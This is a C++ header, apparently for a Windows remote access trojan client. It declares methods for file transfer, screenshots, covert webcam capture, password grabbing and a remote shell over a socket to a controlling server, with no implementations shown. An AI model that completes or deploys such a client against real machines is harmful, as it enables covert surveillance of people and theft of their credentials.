#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include "client.hpp"

#define BUFFER_SIZE (1024)

class Commands {
public:
	void print_help();
	void download(char* filefrom, char* fileto);
	void upload(char* filefrom, char* fileto);
	void screenshot(char* outpath);
	void webcam_snap(char* output);
	void livecam();
	void getpass();
};


class Client : Commands {
public:
	Client(const char* chost, unsigned short int cport);
	void connect_socket();
	bool check_connection();
	void receive_commands();
	int start_shell();

	void cleanup() {
		closesocket(socket);
		WSACleanup();
	}

private:
	WSADATA wsaData;
	struct sockaddr_in addr;
	SOCKET socket;

	int len;
	char rdata[BUFFER_SIZE];
	const char* server;
	unsigned short int port;
};
